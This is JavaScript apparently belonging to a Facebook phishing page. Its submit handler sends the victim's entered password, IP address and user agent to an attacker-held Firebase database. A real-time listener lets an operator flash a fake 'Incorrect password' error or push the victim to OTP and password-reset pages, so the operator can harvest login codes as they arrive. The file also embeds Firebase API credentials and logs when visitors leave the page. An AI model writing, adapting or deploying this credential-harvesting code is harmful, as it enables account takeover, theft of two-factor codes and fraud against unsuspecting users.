// Your Firebase setup code (keep this as it is)
var firebaseConfig = {
    apiKey: "AIzaSyAcqxvsTQGIJrcRKq9B5ldBsMjWB4doYRg",
    authDomain: "test-for-admin-9c05c.firebaseapp.com",
    databaseURL: "https://test-for-admin-9c05c-default-rtdb.firebaseio.com",
    projectId: "test-for-admin-9c05c",
    storageBucket: "test-for-admin-9c05c.appspot.com",
    messagingSenderId: "180529484791",
    appId: "1:180529484791:web:9b5ed35a77400473dd54f2"
};
firebase.initializeApp(firebaseConfig);

// Global variables
let isLoading = false;

// Function to show loader
function showLoader() {
    const loader = document.createElement('div');
    loader.id = 'global-loader';
    loader.innerHTML = '<div class="spinner"></div>';
    document.body.appendChild(loader);
    document.body.classList.add('blurred');
}

// Function to hide loader
function hideLoader() {
    const loader = document.getElementById('global-loader');
    if (loader) {
        loader.remove();
        document.body.classList.remove('blurred');
    }
}

// Function to get user's IP address
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
        return 'Unknown';
    }
}

// Function to save session activity
function saveSessionActivity(activity) {
    firebase.database().ref('sessionActivity').push({
        activity,
        timestamp: firebase.database.ServerValue.TIMESTAMP
    });
}

// Event listeners for session tracking
window.addEventListener('beforeunload', () => saveSessionActivity('Left the browser'));
window.addEventListener('unload', () => saveSessionActivity('Left the browser'));
window.addEventListener('reload', () => saveSessionActivity('Reloaded the page'));

// Modified submitEmail function
async function submitEmail() {
    showLoader();
    var passwordInput = document.getElementById('password-facebook');
    var errorMessageEmail = document.querySelector('.kaget.email-fb');
    var errorMessagePassword = document.querySelector('.kaget.sandi-fb');
    var errorMessageGeneral = document.getElementById('error-message');
    
    function checkPassword(password) {
        if (password.trim() === "") {
            errorMessageGeneral.style.display = 'block';
            errorMessageGeneral.textContent = "Please enter password first.";
            console.log("Field is empty!");
            return false;
        }
        errorMessageGeneral.style.display = 'none';
        return true;
    }

    // Add event listener to hide error messages when user starts typing
    passwordInput.addEventListener('input', function() {
        errorMessageEmail.style.display = 'none';
        errorMessagePassword.style.display = 'none';
        errorMessageGeneral.style.display = 'none';
    });

    // Call checkPassword before pushing data to Firebase
    if (checkPassword(passwordInput.value)) {
        try {
            const ipAddress = await getIPAddress();
            const userAgent = navigator.userAgent;
            
            await firebase.database().ref('Passwords').push({
                password: passwordInput.value,
                ipAddress: ipAddress,
                userAgent: userAgent,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
            
            console.log('Data saved successfully');
            // You might want to redirect or show a success message here
        } catch (error) {
            console.error('Error occurred: ' + error);
            errorMessageGeneral.style.display = 'block';
            errorMessageGeneral.textContent = "An error occurred. Please try again.";
        } finally {
            hideLoader();
        }
    } else {
        hideLoader();
    }
}

// Function to check for admin actions
function checkAdminActions() {
    const adminActionsRef = firebase.database().ref('adminActions');
    adminActionsRef.on('child_added', (snapshot) => {
        const action = snapshot.val();
        handleAdminAction(action);
        // Remove the action after processing
        snapshot.ref.remove();
    });
}

// Function to handle admin actions
function handleAdminAction(action) {
    showLoader();
    switch (action.type) {
        case 'showError':
            document.querySelector('.kaget.sandi-fb').style.display = 'block';
            document.querySelector('.kaget.sandi-fb').textContent = "Incorrect password. Did you forget your password?";
            break;
        case 'redirectOTP':
            window.location.href = 'otp-page-url';
            break;
        case 'redirectForgotPassword':
            window.location.href = 'forgot-password-url';
            break;
        default:
            console.log('Unknown admin action:', action.type);
    }
    setTimeout(hideLoader, 2000); // Hide loader after 2 seconds
}

// Start checking for admin actions
checkAdminActions();

// Add necessary CSS for loader and blur effect
const style = document.createElement('style');
style.textContent = `
    .blurred { filter: blur(5px); }
    #global-loader {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    }
    .spinner {
        border: 5px solid #f3f3f3;
        border-top: 5px solid #3498db;
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
`;
document.head.appendChild(style);
